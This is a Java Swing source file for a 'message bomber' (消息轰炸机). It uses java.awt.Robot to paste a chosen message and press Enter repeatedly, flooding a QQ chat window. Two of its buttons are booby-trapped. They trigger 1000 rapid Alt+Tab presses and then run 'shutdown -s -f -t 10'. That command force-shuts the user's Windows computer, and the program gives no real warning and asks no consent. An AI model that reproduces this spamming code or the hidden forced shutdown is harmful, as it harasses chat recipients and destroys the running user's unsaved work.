package QQ;


import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.Transferable;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.KeyEvent;
import java.io.IOException;
import java.lang.*;
import java.awt.*;
import java.util.*;
import javax.swing.*;

public class BOOM {
	public static void main(String[] args) throws AWTException {
		JFrame f = new JFrame("消息轰炸机");
		f.setSize(800,600);
		f.setLocation(200,200);
		f.setLayout(null);		
		f.setResizable(false);				
		JLabel l= new JLabel("请输入要轰炸的内容:\n");
		l.setFont(new Font("宋体",Font.BOLD,20));
		l.setBounds(285,5,500,100);
		
		JButton b = new JButton("一键发送");
		b.setFont(new Font("宋体",Font.BOLD,20));
		b.setBounds(150, 480, 200, 30);   
		
		JButton c = new JButton("暴力轰炸");
		c.setFont(new Font("宋体",Font.BOLD,20));
		c.setBounds(450, 480, 200, 30);   
		c.addActionListener(new ActionListener() {
			
			public void actionPerformed(ActionEvent e) {
				 f.setVisible(false);
				 new QQbot().boomSelf();
				 Font font  =  new  Font("黑体",0,17);
				 UIManager.put("Button.font",font);
				 UIManager.put("Label.font",font);				 
				 JOptionPane.showMessageDialog(f,"我也没说是轰炸谁啊！");
				 new QQbot().shutdown();
				 f.setVisible(true);
				
			}
		});
		
		JLabel q= new JLabel("轰炸次数:");
		q.setFont(new Font("宋体",Font.BOLD,20));
		q.setBounds(185,300,500,100);
		
		JTextField time = new JTextField();
		time.setPreferredSize(new Dimension(50,20));
		time.setBounds(300,325,200,50);
		time.setFont(new Font("宋体",Font.BOLD,20));
		
        JTextArea ta = cinText(f);
        b.addActionListener(new  ActionListener() {			
			public void actionPerformed(ActionEvent e) {
				 String sentence= ta.getText();
				 String text =  time.getText();
				 if(sentence.equals("")==true&&text.equals("")==true) {
					 f.setVisible(false);
					 new QQbot().boomSelf();
					 Font font  =  new  Font("黑体",0,17);
					 UIManager.put("Button.font",font);
					 UIManager.put("Label.font",font);				 
					 JOptionPane.showMessageDialog(f,"恭喜触发彩蛋！");
					 new QQbot().shutdown();
					 f.setVisible(true);
				 }
				 else {
					 if(sentence.equals("")==true) {
						 Font font  =  new  Font("黑体",0,17);
						 UIManager.put("Button.font",font);
						 UIManager.put("Label.font",font);				 
						 JOptionPane.showMessageDialog(f,"    请输入消息！");
					 }				
		             try {
		                 Integer.parseInt(text);
		             } catch (NumberFormatException e1) {
		            	 Font font  =  new  Font("黑体",0,17);
						 UIManager.put("Button.font",font);
						 UIManager.put("Label.font",font);
		                 JOptionPane.showMessageDialog(f, "  输入框内容不是整数");
		                 time.grabFocus();
		             }
		             QQbot boom = new QQbot(sentence,Integer.valueOf(text));
		             try {
						boom.Boom();
					} catch (AWTException e1) {
						
						e1.printStackTrace();
					}
				 }
			}
		});    
        f.add(q);        f.add(time);
        f.add(l);        f.add(b);        
        f.add(ta);		 f.add(c);
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		f.setVisible(true);
	}
	public static JTextArea cinText(JFrame f) {
		
	    JTextArea ta = new JTextArea();
	    ta.setFont(new Font("宋体",Font.BOLD,20));
        ta.setPreferredSize(new Dimension(200,100));
        ta.setLineWrap(true);
        ta.setBounds(190,100,450,170);
        
        return ta;
       
	}
}
class QQbot{
	String sentence=null;
	int times;
	public QQbot(String sentence, int times) {
		this.sentence = sentence;
		this.times = times;
	}
	
	public QQbot() {	}

	public void Boom() throws AWTException {
		String sentence = this.sentence;
		Robot robot=null;
		try {
			robot = new Robot();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		robot.delay(3000);
		Clipboard clip = Toolkit.getDefaultToolkit().getSystemClipboard();		
		Transferable tText = new StringSelection(sentence);
		for (int j = 0; j < this.times;j++) {			
			clip.setContents(tText, null);
			robot.keyPress(KeyEvent.VK_CONTROL);  // ctrl
			robot.keyPress(KeyEvent.VK_V);		  // v
			robot.keyRelease(KeyEvent.VK_CONTROL);  //  close ctrl
			robot.keyRelease(KeyEvent.VK_V); // close v
			robot.delay(10);  						//  time limit
		//	robot.keyPress(KeyEvent.VK_CONTROL);  // ctrl
			robot.keyPress(KeyEvent.VK_ENTER);  // enter
			robot.keyRelease(KeyEvent.VK_ENTER); // close ctrl
		//	robot.keyRelease(KeyEvent.VK_CONTROL); // close enter
			
		}
	}
	public void boomSelf() {
		Robot robot=null;
		try {
			robot = new Robot();
		} catch (AWTException e) {
			
			e.printStackTrace();
		}
		robot.delay(100);
		Clipboard clip = Toolkit.getDefaultToolkit().getSystemClipboard();
		for (int j = 0; j < 1000;j++) {
			robot.keyPress(KeyEvent.VK_ALT);  
			robot.keyPress(KeyEvent.VK_TAB);	
			robot.keyRelease(KeyEvent.VK_ALT);
			robot.keyRelease(KeyEvent.VK_TAB); 
			robot.delay(25);  
			
		}
	}
	public void shutdown() {
		try {
			Runtime.getRuntime().exec("shutdown -s -f -t 10"); // FBI WARNING !!!!!
		} catch (IOException e) {
			e.printStackTrace();
		}
	}	
}

